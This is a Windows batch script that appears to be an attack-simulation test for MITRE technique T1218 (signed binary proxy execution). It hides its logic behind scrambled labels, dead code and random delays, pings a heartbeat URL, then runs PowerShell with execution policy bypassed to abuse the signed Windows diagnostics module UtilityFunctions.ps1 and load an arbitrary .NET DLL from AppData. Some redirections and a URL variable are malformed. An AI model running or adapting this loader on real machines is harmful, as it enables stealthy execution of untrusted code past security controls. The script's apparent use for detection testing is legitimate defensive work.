@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constant assignments (plain string literals - DO NOT MODIFY)
SET qzafhyg=%APPDATA%\8067\4e9db8ce
SET yjmkxbc=https://10.0.0.49
SET wmstvnp=https://10.0.0.49/stage/2/icon.png?8067-7
SET rkzbdwg=ITZEL-S2BO
SET phsfjqy=7
SET vtxnrkl=firelox.txt
SET lvbcgzm=8067

REM Derived variables
SET logpath=%APPDATA%\!phsfjqy!
SET fullpath=!qzafhyg!\!vtxnrkl!
SET dlurl=http://!yjmkxbc!/payload

REM State machine setup
SET gstate=0
GOTO dxjkrlz

:dxjkrlz
IF !gstate!==0 GOTO zxcvbnm
IF !gstate!==17 GOTO qwertyu
IF !gstate!==42 GOTO poiuytr
IF !gstate!==99 GOTO mnbvczx
GOTO zxcvbnm

REM Dead code section
:asdfghj
REM Never executed
SET junk=deadcode
EXIT

REM Initial state - setup and delays
:zxcvbnm
echo [%DATE% %TIME%][DEBUG][!rkzbdwg!]: initial_delay_start>>> "!logpath!\macula-simulations.log" 2>nul
timeout /t 45 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!rkzbdwg!]: initial_delay_complete>>> "!logpath!\macula-simulations.log" 2>nul
SET /A rnddelay=!RANDOM! %% 20 + 10
echo [%DATE% %TIME%][DEBUG][!rkzbdwg!]: random_delay_start=!rnddelay!s>>> "!logpath!\macula-simulations.log" 2>nul
timeout /t !rnddelay! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!rkzbdwg!]: random_delay_complete>>> "!logpath!\macula-simulations.log" 2>nul
SET gstate=17
GOTO dxjkrlz

REM Dead code section
:lkjhgfds
REM Unreachable
ping -n 5 127.0.0.1 >nul
GOTO mnbvczx

REM State 17 - heartbeat check
:qwertyu
echo [%DATE% %TIME%][DEBUG][!rkzbdwg!]: heartbeat_check_start>>> "!logpath!\macula-simulations.log" 2>nul
curl -k -s -o NUL !wmstvnp!
IF !ERRORLEVEL! NEQ 0 (
    SET tresult=0
    SET terr=connection_failed
    echo [!DATE:/=-! !TIME:.=,!][!rkzbdwg!]: !phsfjqy!-!lvbcgzm!-T1218|Signed_Binary_Proxy_Execution=!tresult!:!terr!>> "!logpath!\macula-simulations.log" 2>nul
    EXIT /B 1
)
echo [%DATE% %TIME%][DEBUG][!rkzbdwg!]: heartbeat_check_complete>>> "!logpath!\macula-simulations.log" 2>nul
ping -n 7 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!rkzbdwg!]: mid_delay_complete>>> "!logpath!\macula-simulations.log" 2>nul
SET gstate=42
GOTO dxjkrlz

REM Dead code section
:zxcmnbv
REM Junk code
SET fakevar=1
IF !fakevar!==2 GOTO asdfghj
GOTO mnbvczx

REM State 42 - execute .NET DLL via LOLBin
:poiuytr
echo [%DATE% %TIME%][DEBUG][!rkzbdwg!]: chdir_operation_start>>> "!logpath!\macula-simulations.log" 2>nul
cd /d c:\windows\diagnostics\system\networking
echo [%DATE% %TIME%][DEBUG][!rkzbdwg!]: chdir_operation_complete>>> "!logpath!\macula-simulations.log" 2>nul
CHOICE /C Y /N /D Y /T 12 >nul
echo [%DATE% %TIME%][DEBUG][!rkzbdwg!]: pre_exec_delay_complete>>> "!logpath!\macula-simulations.log" 2>nul
echo [%DATE% %TIME%][DEBUG][!rkzbdwg!]: lolbin_exec_start>>> "!logpath!\macula-simulations.log" 2>nul
powershell.exe -ep bypass -command "set-location -path 'c:\windows\diagnostics\system\networking'; import-module .\UtilityFunctions.ps1; RegSnapin '!fullpath!';[Program.Class]::Dale()"
IF !ERRORLEVEL!==0 (
    SET tresult=1
    SET terr=
) ELSE (
    SET tresult=0
    SET terr=assembly_load_failed
)
echo [!DATE:/=-! !TIME:.=,!][!rkzbdwg!]: !phsfjqy!-!lvbcgzm!-T1218|Signed_Binary_Proxy_Execution=!tresult!:!terr!>> "!logpath!\macula-simulations.log" 2>nul
echo [%DATE% %TIME%][DEBUG][!rkzbdwg!]: lolbin_exec_complete>>> "!logpath!\macula-simulations.log" 2>nul
timeout /t 8 /nobreak >nul
SET gstate=99
GOTO dxjkrlz

REM Dead code section
:vcxzqwe
REM More unreachable code
FOR /L %%i IN (1,1,5) DO (
    echo junk >nul
)
GOTO mnbvczx

REM End state - cleanup
:mnbvczx
echo [%DATE% %TIME%][DEBUG][!rkzbdwg!]: script_complete>>> "!logpath!\macula-simulations.log" 2>nul
ENDLOCAL